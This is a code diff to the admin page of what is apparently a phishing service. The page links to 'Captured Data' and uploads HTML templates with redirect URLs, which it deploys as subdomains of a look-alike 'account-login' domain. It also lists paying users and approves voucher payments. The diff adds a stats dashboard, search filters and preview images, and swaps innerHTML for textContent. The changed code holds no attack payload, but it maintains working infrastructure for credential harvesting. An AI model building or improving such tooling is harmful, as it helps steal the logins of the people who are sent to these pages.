@@ -39,6 +39,14 @@
         .badge-active { background: #d4edda; color: #155724; }
         .badge-locked { background: #f8d7da; color: #721c24; }
         .badge-banned { background: #333; color: #fff; }
+
+        /* Stats Dashboard */
+        #system-health { display:flex; gap:20px; margin-bottom:30px; padding:25px; background:#fff; border-radius:8px; border: 1px solid #eee; justify-content:space-around; }
+        .stat-box { text-align: center; }
+        .stat-num { font-size: 2.5rem; margin: 0; font-weight: 800; }
+        .stat-label { color: #666; font-weight: 600; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px; }
+
+        .search-bar { padding: 10px; width: 100%; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; }
     </style>
 </head>
 <body>
@@ -47,6 +55,22 @@
             <a href="captures.html">View Captured Data &rarr;</a>
         </div>
         <h1>🚀 Cloud Admin Panel</h1>
+
+        <!-- System Health -->
+        <div id="system-health">
+            <div class="stat-box">
+                <h3 id="stat-pending" class="stat-num" style="color:#f5a623;">-</h3>
+                <span class="stat-label">Pending Vouchers</span>
+            </div>
+            <div class="stat-box">
+                <h3 id="stat-users" class="stat-num" style="color:#0070f3;">-</h3>
+                <span class="stat-label">Total Users</span>
+            </div>
+            <div class="stat-box">
+                <h3 id="stat-sites" class="stat-num" style="color:#28a745;">-</h3>
+                <span class="stat-label">Active Sites</span>
+            </div>
+        </div>
 
         <div class="tabs">
             <div class="tab active" onclick="switchTab('vouchers')">Pending Vouchers</div>
@@ -66,7 +90,10 @@
         <!-- Users Section -->
         <div id="users-section" class="form-section hidden">
             <h2>User Database</h2>
-            <button onclick="loadUsers()" style="margin-bottom: 10px;">Refresh</button>
+            <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
+                <button onclick="loadUsers()">Refresh</button>
+                <input type="text" id="user-search" onkeyup="filterTable('user-list', 'user-search')" placeholder="Search Users..." style="width: 300px; padding: 8px;">
+            </div>
             <div id="user-list">Loading...</div>
         </div>
 
@@ -86,6 +113,11 @@
                 <small>Leave blank to use default.</small>
             </div>
             <div class="form-group">
+                <label>Preview Image URL (Optional)</label>
+                <input type="text" id="tpl-preview" placeholder="https://example.com/preview.jpg">
+                <small>Used for deployment thumbnail.</small>
+            </div>
+            <div class="form-group">
                 <label>HTML Content</label>
                 <input type="file" id="tpl-file" accept=".html,.txt" onchange="loadFile(this, 'tpl-content')" style="margin-bottom: 10px;">
                 <textarea id="tpl-content" placeholder="<html>...</html>"></textarea>
@@ -96,7 +128,10 @@
         <!-- Sites Section -->
         <div id="sites-section" class="form-section hidden">
             <h2>Manage Deployed Sites</h2>
-            <button onclick="loadSites()" style="margin-bottom:10px;">Refresh List</button>
+            <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
+                <button onclick="loadSites()">Refresh List</button>
+                <input type="text" id="site-search" onkeyup="filterTable('site-list', 'site-search')" placeholder="Search Sites..." style="width: 300px; padding: 8px;">
+            </div>
             <div id="site-list">Loading...</div>
         </div>
 
@@ -120,6 +155,11 @@
     <script>
         const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';
 
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+             loadAllStats();
+        });
+
         function switchTab(tab) {
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
             document.querySelectorAll('.form-section').forEach(f => f.classList.add('hidden'));
@@ -127,19 +167,16 @@
             if (tab === 'vouchers') {
                 document.querySelector('.tabs .tab:nth-child(1)').classList.add('active');
                 document.getElementById('vouchers-section').classList.remove('hidden');
-                loadVouchers();
             } else if (tab === 'users') {
                 document.querySelector('.tabs .tab:nth-child(2)').classList.add('active');
                 document.getElementById('users-section').classList.remove('hidden');
-                loadUsers();
             } else if (tab === 'templates') {
                 document.querySelector('.tabs .tab:nth-child(3)').classList.add('active');
                 document.getElementById('templates-section').classList.remove('hidden');
-                loadTemplates();
+                loadTemplates(); // Load explicitly
             } else if (tab === 'sites') {
                 document.querySelector('.tabs .tab:nth-child(4)').classList.add('active');
                 document.getElementById('sites-section').classList.remove('hidden');
-                loadSites();
             } else {
                 document.querySelector('.tabs .tab:nth-child(5)').classList.add('active');
                 document.getElementById('proxy-section').classList.remove('hidden');
@@ -156,43 +193,78 @@
             reader.readAsText(file);
         }
 
+        async function loadAllStats() {
+            // Load everything to populate stats
+            await Promise.all([loadVouchers(), loadUsers(), loadSites()]);
+        }
+
+        function updateStat(id, val) {
+            const el = document.getElementById(id);
+            if(el) el.innerText = val;
+        }
+
         // --- VOUCHERS ---
         async function loadVouchers() {
             const div = document.getElementById('voucher-list');
-            div.innerHTML = 'Loading...';
             try {
                 const res = await fetch(`${WORKER_URL}/api/admin/vouchers`, { credentials: 'include' });
                 if (res.status === 401) { window.location.href = 'admin-login.html'; return; }
                 const data = await res.json();
 
                 div.innerHTML = '';
-                if (data.success && data.data.length > 0) {
-                    const table = document.createElement('table');
-                    table.innerHTML = `<thead><tr>
-                        <th>Time</th><th>User Code</th><th>Type</th><th>Voucher Code</th><th>Plan</th><th>Action</th>
-                    </tr></thead>`;
-                    const tbody = document.createElement('tbody');
-                    data.data.forEach(v => {
-                        const tr = document.createElement('tr');
-                        tr.innerHTML = `
-                            <td>${new Date(v.submitted).toLocaleString()}</td>
-                            <td>${v.uniqueCode}</td>
-                            <td>${v.voucherType}</td>
-                            <td><code>${v.voucherCode}</code></td>
-                            <td>${v.plan.toUpperCase()}</td>
-                            <td>
-                                <button class="btn-success" onclick="processVoucher('${v.id}', 'approve')">Approve</button>
-                                <button class="btn-danger" onclick="declineVoucher('${v.id}')">Decline</button>
-                            </td>
-                        `;
-                        tbody.appendChild(tr);
-                    });
-                    table.appendChild(tbody);
-                    div.appendChild(table);
-                } else {
-                    div.innerHTML = '<p>No pending vouchers.</p>';
+                if (data.success) {
+                    updateStat('stat-pending', data.data.length);
+                    if (data.data.length > 0) {
+                        const table = document.createElement('table');
+                        const thead = document.createElement('thead');
+                        thead.innerHTML = '<tr><th>Time</th><th>User Code</th><th>Type</th><th>Voucher Code</th><th>Plan</th><th>Action</th></tr>';
+                        table.appendChild(thead);
+
+                        const tbody = document.createElement('tbody');
+                        data.data.forEach(v => {
+                            const tr = document.createElement('tr');
+
+                            [new Date(v.submitted).toLocaleString(), v.uniqueCode, v.voucherType].forEach(text => {
+                                const td = document.createElement('td');
+                                td.textContent = text;
+                                tr.appendChild(td);
+                            });
+
+                            const tdVoucher = document.createElement('td');
+                            const codeEl = document.createElement('code');
+                            codeEl.textContent = v.voucherCode;
+                            tdVoucher.appendChild(codeEl);
+                            tr.appendChild(tdVoucher);
+
+                            const tdPlan = document.createElement('td');
+                            tdPlan.textContent = v.plan ? v.plan.toUpperCase() : 'UNKNOWN';
+                            tr.appendChild(tdPlan);
+
+                            const tdAction = document.createElement('td');
+                            const btnApprove = document.createElement('button');
+                            btnApprove.className = 'btn-success';
+                            btnApprove.textContent = 'Approve';
+                            btnApprove.onclick = () => processVoucher(v.id, 'approve');
+
+                            const btnDecline = document.createElement('button');
+                            btnDecline.className = 'btn-danger';
+                            btnDecline.textContent = 'Decline';
+                            btnDecline.style.marginLeft = '5px';
+                            btnDecline.onclick = () => declineVoucher(v.id);
+
+                            tdAction.appendChild(btnApprove);
+                            tdAction.appendChild(btnDecline);
+                            tr.appendChild(tdAction);
+
+                            tbody.appendChild(tr);
+                        });
+                        table.appendChild(tbody);
+                        div.appendChild(table);
+                    } else {
+                        div.innerHTML = '<p>No pending vouchers.</p>';
+                    }
                 }
-            } catch (e) { div.innerHTML = 'Error: ' + e.message; }
+            } catch (e) { div.textContent = 'Error: ' + e.message; }
         }
 
         async function processVoucher(id, action, reason = null) {
@@ -224,66 +296,103 @@
         // --- USERS ---
         async function loadUsers() {
              const div = document.getElementById('user-list');
-            div.innerHTML = 'Loading...';
             try {
                 const res = await fetch(`${WORKER_URL}/api/admin/users`, { credentials: 'include' });
                 const data = await res.json();
 
                 div.innerHTML = '';
-                if (data.success && data.data.length > 0) {
-                    const table = document.createElement('table');
-                    table.innerHTML = `<thead><tr>
-                        <th>Unique Code</th><th>Plan</th><th>Status</th><th>Strikes</th><th>Expiry</th>
-                    </tr></thead>`;
-                    const tbody = document.createElement('tbody');
-                    data.data.forEach(u => {
-                        const expiry = u.expiry ? new Date(u.expiry).toLocaleDateString() : 'N/A';
-                        const tr = document.createElement('tr');
-                        tr.innerHTML = `
-                            <td>${u.code}</td>
-                            <td>${u.plan.toUpperCase()}</td>
-                            <td><span class="badge badge-${u.status}">${u.status.toUpperCase()}</span></td>
-                            <td>${u.strikes || 0}</td>
-                            <td>${expiry}</td>
-                        `;
-                        tbody.appendChild(tr);
-                    });
-                    table.appendChild(tbody);
-                    div.appendChild(table);
-                } else {
-                    div.innerHTML = '<p>No users found.</p>';
+                if (data.success) {
+                    updateStat('stat-users', data.data.length);
+                    if (data.data.length > 0) {
+                        const table = document.createElement('table');
+                        const thead = document.createElement('thead');
+                        thead.innerHTML = '<tr><th>Unique Code</th><th>Plan</th><th>Status</th><th>Strikes</th><th>Expiry</th></tr>';
+                        table.appendChild(thead);
+
+                        const tbody = document.createElement('tbody');
+                        data.data.forEach(u => {
+                            const tr = document.createElement('tr');
+
+                            const tdCode = document.createElement('td');
+                            tdCode.textContent = u.code;
+                            tr.appendChild(tdCode);
+
+                            const tdPlan = document.createElement('td');
+                            tdPlan.textContent = u.plan ? u.plan.toUpperCase() : 'FREE';
+                            tr.appendChild(tdPlan);
+
+                            const tdStatus = document.createElement('td');
+                            const badge = document.createElement('span');
+                            badge.className = `badge badge-${u.status}`;
+                            badge.textContent = u.status ? u.status.toUpperCase() : 'UNKNOWN';
+                            tdStatus.appendChild(badge);
+                            tr.appendChild(tdStatus);
+
+                            const tdStrikes = document.createElement('td');
+                            tdStrikes.textContent = u.strikes || 0;
+                            tr.appendChild(tdStrikes);
+
+                            const tdExpiry = document.createElement('td');
+                            tdExpiry.textContent = u.expiry ? new Date(u.expiry).toLocaleDateString() : 'N/A';
+                            tr.appendChild(tdExpiry);
+
+                            tbody.appendChild(tr);
+                        });
+                        table.appendChild(tbody);
+                        div.appendChild(table);
+                    } else {
+                        div.innerHTML = '<p>No users found.</p>';
+                    }
                 }
-            } catch (e) { div.innerHTML = 'Error: ' + e.message; }
+            } catch (e) { div.textContent = 'Error: ' + e.message; }
         }
 
         // --- SITES ---
         async function loadSites() {
             const list = document.getElementById('site-list');
-            list.innerHTML = 'Loading...';
             try {
                 const res = await fetch(`${WORKER_URL}/api/admin/sites`, { credentials: 'include' });
                 const data = await res.json();
                 list.innerHTML = '';
 
-                if (data.success && data.data.length > 0) {
-                    const table = document.createElement('table');
-                    table.innerHTML = `<thead><tr><th>Subdomain</th><th>Action</th></tr></thead>`;
-                    const tbody = document.createElement('tbody');
-                    data.data.forEach(site => {
-                        const tr = document.createElement('tr');
-                        tr.innerHTML = `
-                            <td><a href="https://${site}.account-login.co.za" target="_blank">${site}</a></td>
-                            <td><button class="btn-danger" onclick="deleteSite('${site}')">Delete</button></td>
-                        `;
-                        tbody.appendChild(tr);
-                    });
-                    table.appendChild(tbody);
-                    list.appendChild(table);
-                } else {
-                    list.innerText = 'No sites found.';
+                if (data.success) {
+                    updateStat('stat-sites', data.data.length);
+                    if (data.data.length > 0) {
+                        const table = document.createElement('table');
+                        const thead = document.createElement('thead');
+                        thead.innerHTML = '<tr><th>Subdomain</th><th>Action</th></tr>';
+                        table.appendChild(thead);
+
+                        const tbody = document.createElement('tbody');
+                        data.data.forEach(site => {
+                            const tr = document.createElement('tr');
+
+                            const tdLink = document.createElement('td');
+                            const a = document.createElement('a');
+                            a.href = `https://${site}.account-login.co.za`;
+                            a.target = "_blank";
+                            a.textContent = site;
+                            tdLink.appendChild(a);
+                            tr.appendChild(tdLink);
+
+                            const tdAction = document.createElement('td');
+                            const btn = document.createElement('button');
+                            btn.className = 'btn-danger';
+                            btn.textContent = 'Delete';
+                            btn.onclick = () => deleteSite(site);
+                            tdAction.appendChild(btn);
+                            tr.appendChild(tdAction);
+
+                            tbody.appendChild(tr);
+                        });
+                        table.appendChild(tbody);
+                        list.appendChild(table);
+                    } else {
+                        list.textContent = 'No sites found.';
+                    }
                 }
             } catch (e) {
-                list.innerText = 'Error loading sites: ' + e.message;
+                list.textContent = 'Error loading sites: ' + e.message;
             }
         }
 
@@ -309,16 +418,50 @@
 
                 if (data.success && data.data.length > 0) {
                     const table = document.createElement('table');
-                    table.innerHTML = `<thead><tr><th>Name</th><th>Redirect</th><th>Action</th></tr></thead>`;
+                    const thead = document.createElement('thead');
+                    thead.innerHTML = '<tr><th>Name</th><th>Preview</th><th>Redirect</th><th>Action</th></tr>';
+                    table.appendChild(thead);
+
                     const tbody = document.createElement('tbody');
                     data.data.forEach(tpl => {
-                        const redirect = tpl.redirectUrl ? `<a href="${tpl.redirectUrl}" target="_blank">Link</a>` : 'Default';
                         const tr = document.createElement('tr');
-                        tr.innerHTML = `
-                            <td>${tpl.name}</td>
-                            <td>${redirect}</td>
-                            <td><button class="btn-danger" onclick="deleteTemplate('${tpl.name}')">Delete</button></td>
-                        `;
+
+                        const tdName = document.createElement('td');
+                        tdName.textContent = tpl.name;
+                        tr.appendChild(tdName);
+
+                        const tdPreview = document.createElement('td');
+                        if (tpl.previewUrl) {
+                            const img = document.createElement('img');
+                            img.src = tpl.previewUrl;
+                            img.style.height = "30px";
+                            img.style.borderRadius = "4px";
+                            tdPreview.appendChild(img);
+                        } else {
+                            tdPreview.textContent = 'None';
+                        }
+                        tr.appendChild(tdPreview);
+
+                        const tdRedirect = document.createElement('td');
+                        if (tpl.redirectUrl) {
+                            const a = document.createElement('a');
+                            a.href = tpl.redirectUrl;
+                            a.target = "_blank";
+                            a.textContent = "Link";
+                            tdRedirect.appendChild(a);
+                        } else {
+                            tdRedirect.textContent = "Default";
+                        }
+                        tr.appendChild(tdRedirect);
+
+                        const tdAction = document.createElement('td');
+                        const btn = document.createElement('button');
+                        btn.className = "btn-danger";
+                        btn.textContent = "Delete";
+                        btn.onclick = () => deleteTemplate(tpl.name);
+                        tdAction.appendChild(btn);
+                        tr.appendChild(tdAction);
+
                         tbody.appendChild(tr);
                     });
                     table.appendChild(tbody);
@@ -333,6 +476,7 @@
             const name = document.getElementById('tpl-name').value;
             const content = document.getElementById('tpl-content').value;
             const redirectUrl = document.getElementById('tpl-redirect').value;
+            const previewUrl = document.getElementById('tpl-preview').value;
 
             if (!name || !content) return showMessage('Missing fields', 'error');
 
@@ -344,7 +488,7 @@
                 const res = await fetch(`${WORKER_URL}/api/admin/templates`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({name, content, redirectUrl}),
+                    body: JSON.stringify({name, content, redirectUrl, previewUrl}),
                     credentials: 'include'
                 });
                 const data = await res.json();
@@ -353,6 +497,7 @@
                     document.getElementById('tpl-name').value = '';
                     document.getElementById('tpl-content').value = '';
                     document.getElementById('tpl-redirect').value = '';
+                    document.getElementById('tpl-preview').value = '';
                     loadTemplates();
                 } else {
                     showMessage(data.error, 'error');
@@ -392,6 +537,17 @@
             }
         }
 
+        function filterTable(tableId, inputId) {
+            const term = document.getElementById(inputId).value.toLowerCase();
+            const container = document.getElementById(tableId);
+            const rows = container.querySelectorAll('tbody tr');
+
+            rows.forEach(row => {
+                const text = row.innerText.toLowerCase();
+                row.style.display = text.includes(term) ? '' : 'none';
+            });
+        }
+
         function showMessage(text, type) {
             const el = document.getElementById('message');
             el.innerText = text;
@@ -399,9 +555,6 @@
             el.style.display = 'block';
             setTimeout(() => { el.style.display = 'none'; }, 5000);
         }
-
-        // Initial load
-        loadVouchers();
     </script>
 </body>
 </html>
